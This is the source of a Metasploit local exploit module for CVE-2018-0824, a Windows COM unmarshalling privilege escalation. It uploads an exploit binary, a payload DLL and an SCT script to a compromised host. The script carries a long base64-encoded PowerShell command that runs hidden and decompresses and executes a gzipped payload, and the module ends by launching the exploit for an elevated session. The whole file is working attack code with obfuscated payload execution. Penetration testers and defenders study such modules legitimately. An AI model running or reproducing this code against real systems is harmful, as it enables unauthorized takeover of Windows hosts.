# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Windows unmarshal post exploitation',
      'Description' => %q{
        This module exploits a local privilege escalation bug which exists
        in microsoft COM for windows when it fails to properly handle serialized objects.},
      'References'  =>
        [
          ['CVE', '2018-0824'],
          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824'],
          ['URL', 'https://github.com/x73x61x6ex6ax61x79/UnmarshalPwn'],
          ['EDB', '44906']
        ],
      'Author'      =>
        [
          'Nicolas Joly', # Vulnerability discovery
          'Matthias Kaiser', # Exploit PoC
          'Sanjay Gondaliya', # Modified PoC
          'Pratik Shah <pratik@notsosecure.com>' # Metasploit module
        ],
      'DisclosureDate' => 'Aug 05 2018',
      'Arch'           => [ARCH_X64],
      'SessionTypes'   => ['meterpreter'],
      'Platform'       => ['win'],
      'Targets'        =>
        [
          ['Windows x64', { 'Arch' => ARCH_X64 }]
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => 'False'
        }
    ))

    register_options(
      [
      OptString.new('EXPLOIT_NAME',
        [false, 'The filename to use for the exploit binary (%RAND% by default).', nil]),
      OptString.new('SCRIPT_NAME',
        [false, 'The filename to use for the COM script file (%RAND% by default).', nil]),
      OptString.new('PAYLOAD_NAME',
        [false, 'The filename for the payload dll be used on the target host.', nil]),
      OptString.new('PATH',
        [false, 'Path to write binaries (%TEMP% by default).', nil]),
      ])
  end

  def setup
    super
    validate_active_host
    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
    @payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
    @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
    @payload_name = "#{payload_name}.dll" unless payload_name.match(/\.dll$/i)
    @script_name = "#{script_name}.sct" unless payload_name.match(/\.sct$/i)
    @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
    @payload_path = "#{temp_path}\\#{payload_name}"
    @exploit_path = "#{temp_path}\\#{exploit_name}"
    @script_path = "#{temp_path}\\#{script_name}"
    @payload_dll = generate_payload_dll
  end

  def validate_active_host
    begin
      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue Rex::Post::Meterpreter::RequestError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      raise Msf::Exploit::Failed, 'Could not connect to session'
    end
  end

  def validate_remote_path(path)
    unless directory?(path)
      fail_with(Failure::Unreachable, "#{path} does not exist on the target")
    end
  end

  def validate_target
    if sysinfo['Architecture'] == ARCH_X86
      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
    end
    if sysinfo['OS'] =~ /XP/
      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')
    end
  end

  def ensure_clean_destination(path)
    if file?(path)
      print_status("#{path} already exists on the target. Deleting...")
      begin
        file_rm(path)
        print_status("Deleted #{path}")
      rescue Rex::Post::Meterpreter::RequestError => e
        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
        print_error("Unable to delete #{path}")
      end
    end
  end

  def upload_exploit
    local_exploit_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'UnmarshalPwn.exe')
    upload_file(exploit_path, local_exploit_path)
    print_status("Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}")
  end

  def upload_payload
    write_file(payload_path, payload_dll)
    print_status("Payload (#{payload_dll.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}")
  end

  def upload_script
    vprint_status("Creating the sct file with payload #{payload_path}")
    local_script_template_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-0824', 'script_template')
    script_template_data = ::IO.read(local_script_template_path)
    vprint_status("script_template_data.length =  #{script_template_data.length}")
    command = '%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBIAFMAeQB5AEYAcwBDAEEANwBWAFcALwBXACsAYgBPAEIAagArAGUAWgBYADYAUAA2AEEAcABVAGsARABMAEUAdABLAG0AdgBhADMAUwBwAEkATQBFAEcAcgBLAFEASgB1AFcAcgBhAFIAZABOAEYAQgB4AHcAWQB6AEEARgAwAHkAUwA5ADIALwA5ACsAcgAwAG4AbwB1AGwAdAAzAHQANQAxADAASwBCAEcAMgBlAFQAKwBmADkANwBGAGYATAA4AHMAMABZAEoAaQBtAHcAbABLADUAMQBKAG4AdwB4ACsASABCAHEANgBtAGYAKwA0AGsAZwBOAGgASwB6AEoAVABRAGUAeAA5AE8AWgA5AE8AbwBWAEwARABlAFcAbgA0AFUAUABnAG4AaQBqAFoATgBtAEEASgBqADUATwBGADIAZABuAC8AVABMAFAAVQBjAHAAMgA4AC8AWQA1AFkAawBwAFIAbwBPAFMAVwBZAEYAUwBJAGsAdgBDAG4ANABNAFUAbwBSADIAOAB2AGIAdQA5AFEAQQBMAGEARgB4AHUAZgAyAE8AYQBHADMAUAB0AG0ATABiAGYAdAArAEUAQwBQAGgAcgBaAEsARwAvAE4AdQBZAEIAagA2AFAAcABXADEAbABCAEQATwB4ACsAZQBsAFQAVQA3AHAANQAyADEAMgAwAHQAZgB2AFMASgA0AFgAWQB0AEwAWQBGAFEAMABrADcASgBLAFEAcABDAFYAOABrADcAdABEAGUAWgBrAGgAcwBtAGoAagBJAGEAVQBHAFgAcgBPADMAaAA5AFAAaQBvADcAYQBTAEYAdgAwAFEAVABzAFAAYQBBAFQATQBSAGkARwBoAFoATgBDAFgASwBBAFgANAA1AFkAbQBhAGMAQwBaAE0AUABWAGQAeAAvAEYASgBnAHkAbgBPAFEAMgBVAE0ATQB4AFIAVQBUAFIAYgB3AGcAMAAzAGYATABOAFkALwBDADcAZQA3AEwAMQBlAGwAaQBuAEQAQwBXAG8AYgBLAFUATQA1AHoAUwB5AFUAUAArAEEAQQBGAGUAMgBoAG4ANABZAEUAWABhAEwAbABBAHIAUQBzAGwAdQBNADAAVwBrAGcAUwBpAEQAMwBRAEYAUgBJAGIAYQBVAGwASQBTAC8AZwBWAE0AKwBJAEUAcgBXAHYATQBmAGwAWgBKAGYASwA0AEUAVQBsAE8AVwBTAHkAMgBvADQAWABkAFoAbQBqAFEAcwBDAGQAcgBwAE4AVgA4AEkARQA2AG8AdQB3AFYATgBYAEgAawBEADcAYwBuAGgAdwBlAEwAQwBzAGEAWgBLAEYAeQBuAE8AUwB3AE8AagBWAFQAVABWAEcARQBKAGsANABwAFEAVwB1AHgARAA0AEkAYwBrAHMAdwB3AFkAdgBQAGEATAA2AEYAYQBjAFAATwBTAHkAUQB0AG4AbgBBAFYARwB0AEcAdwA5AFcAUAB0AGIAaQAwAEsAZwBnAC8ANABDAGwAWgB1AFgASQByAEQAQgBXAGoAcwA2ADkAagBJAHoARwA3AEUAMQAzAC8ATQB4AHcARgBhADQAaABRAE4AdABxAG0AZgA0AEsAQwBtAG4AUABnAFMAdgBHAGgASgBVAEoAVgBmAHUAeABhAGIAUQBFAHgAaQBjAC8AOABCAGgAUQBOAEUAVQBPAFEAegBEAGgAbQB2ADgAbgBkAHEAVwBvAEwAWgBrADYANQBhAFkAaABLAGkAWABBAG0AZwBSAEEAVgBFAEIAZABXAFQAdgBnADEAbQBWAHcAVwB4AGEAYQBRAG0AUwBnAEMAZwAzAFIAeABvADEAMQBnAEMAMABWAEUAdAB2AFMAZgAzAHQAdgBiAE8ANQB5AEQAVQA3AEIATwAvAEsARgByAEMAdABJAFMAZABGAHIAUQBFAEMALwBrAEUAaABTADEAQgBTAFEAdQA4AC8ANgBTAFUAagBGAGIARAA1AHQAZAB3AHoAWgBJAHcASABQAGcARgBxADgAMAB0AHAAQgByAEgAdgBiADgAKwBUAFEAdQBXAGwAdwBIAFUARABIAEsAMwByAFEAdwBGADIAQwBjAGMAaQBwAFkAdwB4AEMARgBTAHQAeABhAE8AYQByAC8ATgBGADQASABvACsANABUAEEARABnAEIATABEADEAQQBJAFcATwBFAEEAVwBJAHcAegBJAFkAYwBRAG8AZQBwAFMAMgAwAEwATQBTAEQASwBDAEUAcABDAG8ATgByAHgATwAvAEEAaQAyADkANQA3AGwARgBYAEgAOABDAEkAWABOAHYAOABkAFgAOAAzAGgASABXAG8ANQBFAEQAYwBHAHoANgBLAEMAOABGAHEARwBzAEoAYgBnADQAWgAzAEIAdQBjAEYAUwBCAFEAdgAvAEYAOQA3AFAAagBvAG8AcQBpAG4ANgBOADkARgBjAFIANgBZADkAeQBvAFcAOABiADUAMwBMAGcAUABPAEIAbgAzAGcARgBUAHAANQB3AHgAUwAxADMATwBhAHEASAA2AEIAVABuAHUANwBvADAARgA4ADMAZABIAHcANABHAFEANgBvAEkAOABLAFAASgBwACsATwBYAE4AVgB5ADMARwB2AEQAVABNAGMARQBjAHQAZwAxAGwAegBEAFkAeQBlAE8ARABkAHcAMQBJAHAAaAB2AEgAUwAyAGEATQBqAG4ANwBhAE4AdgBEAGsAVABVAFkASwB2AGwAZwBFAHkAOABWAG8AegBDADAAbwBiAHEAZABkAFYAVQBsAEcATwBMAGYAMwBKAEgAcQBPAEsAQwBIACsAKwBQAFoAMwBjAFoAUQBRAGoAVwBKAHIAcQBKADUAZgAyADEATQA0AHkAcwBEAEgAUABYAEgAawBSAEgAQgBXAHoAWABpAFEASgBXAHYANQBVAGkAVgA5AGYANwBZAFUAbQBNAE4AeQAwAHAAawB6AFkAYQB6AFgAdgBmAGEANgBMAHcAagBLAG4ANgAwAEQARQBzAFoAZQBrAC8AKwBuAHYAeABvAHYAZAA3AHcAYQBtAE0AcgBFADMATwBrAHgAUABwAEYAcQBIAGUAUAA5AEUAcAAvAHgAZgBXAHYAVgArAGYAagBnAFYAYgBOAEEAegA2AGYAegBRAHMATgBhACsAQgBIADAAKwBjAHoATgAwAGEAZQBtADYAbQBlAHAAbAAvAFAAMwBNAHkASQAzAHEAeQBqAG0AVAB2AHUAOQBQAFIAWQBoAFgAVQBEAGIAOABhAFoAMQBZAEcAbgAyAHcAVQBjAG0ARwAzAGQAbgBoAHoANwAzAGsAbAAyAG0ANwBnAHkAWQBPAFIAWgBSAGgAcABiAHcAYgBKAHYARAA0AE4ARQA3AFgAUgBjAHAAegBzAHgATQBOAEoAdABiAHkAVgB2ADEAcABxADgAMgBiAG8AVAAwAEsARwBuAGIAcABxAGsASABGAFoAbAAyAG4ARgBQADEAVwBxADAAdQBiAEMATgAwAHIAVABuAHYAZgBHAGQAOQBqAGkAeABlAGgAdgBUADEAaABSAHYAaABVAGQAcgBKAHgAMgB1AHAAdwBXAEEAbwBrADcATQBnAE4AagBPAEUAUgAwADQAYwBuAEwAcQA5AHAATABsAGgAawBPAGwARABEAHAAZABGAEMAMwA1AGEASAB5AHMAagBzAEsAcgA2ADYAMwB2AGIAZQA1AGMAWgAzAFQAdgBlAHUAYQBKAG0AOABiADMAawArAE4ATABOAGsAdABEADkAZABhAGQAUABaAG8AawBkAGgAUQBOADcATABvAFQASAAvAEsAdABiAEYAcgBqAFMARABIAHYAKwAxAG8AVgBpAGEANwBhAGoAZwB3ACsAUwArAGEATwA3AHgANAA2AFgAUQBlAFAATgBnAG4AOQBlAEMAWABqADAAVAB1AFAATABqADAAeQBvAHQASABBAEIARQA0AGsAbwA5ADQANQAxAFcAWQB1AEcAWgBXAHAAZQA1ADcAUwBlAGEAWABlAGUAZQArAEMAVABkAFgAbQBzAGIAOQB6AEkARwBkAG4AbgB6AGYAZwBNAHAANwBOADUAdwBoAHcAZwBkAHAAMgBoAC8ATABkAGMARAAyAFAAYgBNAGgAcgBWAEsANwBzADkAUQBRAHAAdABUADcAVQA5ADcAMgBzAGwATwBYADkAcQBlADUAdwBMAHQAaQBlAGwAdwBFAFcAeQBVAGcARwBEAG0AawBhAHgASwBZAG8AcwAwAHEAUAA0AEoAWAB6AHgAbgBuAFMAVwAzAFgAQgBqADUARwBtADgATgAvAEEAMwB3AGUAZgBRAEMAbQBsAGkAdgBXAE4AawA1AHgAcQBtAFQALwBxADEAWgBnADUAZQBMAEQAcAA5AC8AWAAxADAATgBwAGUAMAAyAEkASQBYAEIAcgB3AHUARwBSAHkATgAvAEQATwBxAGUASgB4ADMAQgAvADYAWABVAHAAdQBPADkAMwBaAGgAdwArAHYAKwBVADYARAByAGQAYgBZAHIASgBMAHoAWgAzAHYAbwBSAHoAMwBQADkAUABNAGkAOQBnAG4AcwBMAFcAaABuADkAVgBHAG0AMAAxAHoAZgB0ADYAZwBwAHgAVgB4AEQARgBIAGMAMwBtAGgAWABLAFUAMABUAGcAVABnAEMAMwBoAHYAcABJAFUAQQBpAGgAQQBlACsAUAB2AEoAdABCAGEAOQA0ADEAVABOADYALwBIAFIAZwBlAEgANwAwADQAawBvAFEAbgBRAGUAbAByADQANgB5AFgAegBzADYAdQBJAFUAbwA0AFoATwA2AEQAOQBoAGkAbABFAFkAdABiADgAdQBaAFkAbABxAEUATgB5AHAAdQBlAEQARABuACsAZgBGADUAOQBtAG0AMQBGAE0ATgBUAGkAVABiAFMAQwBaAFcAZQBYAFYASABZAGwAZgB1AHcAMAAwAG8ARgBqACsAdgA4AHoAVwB2AHYAagBMAG8AWgBYACsAQwA5AG8AZgBWADMANwBoADYAOAAvAGgAYQBEAGMAMgBtAFgAOAAzAGYASwAzAEMANwA4AEUANgBLACsAbgA3AHYAbQBZAGcAYQBnAEYASgB6AFoAQgB1ADgAdgBDAGkAdwBqAHMAcQBmAEgAOABJAHMAVQBMAEEANwBWAGYANwBoADkAKwBEAGIANABvADIAZABzAEoAWABMAEEATwBEAC8ANABDADUANABxAFoARwBXADgATABBAEEAQQA9ACcAJwApACkAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA='
    script_data = script_template_data.sub!('SCRIPTED_COMMAND', command)
    if script_data == nil
      fail_with(Failure::BadConfig, "Failed to substitute command in script_template")
    end
    vprint_status("Writing #{script_data.length} bytes to #{script_path} to target")
    write_file(script_path, script_data)
    vprint_status('Script uploaded successfully')
  end

  def exploit
    print_status("exploit path is: #{exploit_path}")
    print_status("payload path is: #{payload_path}")
    print_status("script path is: #{script_path}")
    begin
      validate_active_host
      validate_target
      validate_remote_path(temp_path)
      ensure_clean_destination(exploit_path)
      ensure_clean_destination(payload_path)
      ensure_clean_destination(script_path)
      vprint_status("Uploading Payload to #{payload_path}")
      upload_payload
      vprint_status("Uploading Script to #{script_path}")
      upload_script
      vprint_status("Uploading Exploit to #{exploit_path}")
      upload_exploit
      vprint_status('Launching Exploit...')
      command_output = cmd_exec(exploit_path + ' ' + script_path)
      vprint_status(command_output)
      print_good('Exploit completed, wait for elevated session')
    rescue Rex::Post::Meterpreter::RequestError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      print_good('Exploit failed, cleaning up')
      print_error(e.message)
      ensure_clean_destination(exploit_path)
      ensure_clean_destination(payload_path)
      ensure_clean_destination(script_path)
    end
  end

  attr_reader :exploit_name
  attr_reader :payload_name
  attr_reader :script_name
  attr_reader :payload_dll
  attr_reader :temp_path
  attr_reader :exploit_path
  attr_reader :payload_path
  attr_reader :script_path
end

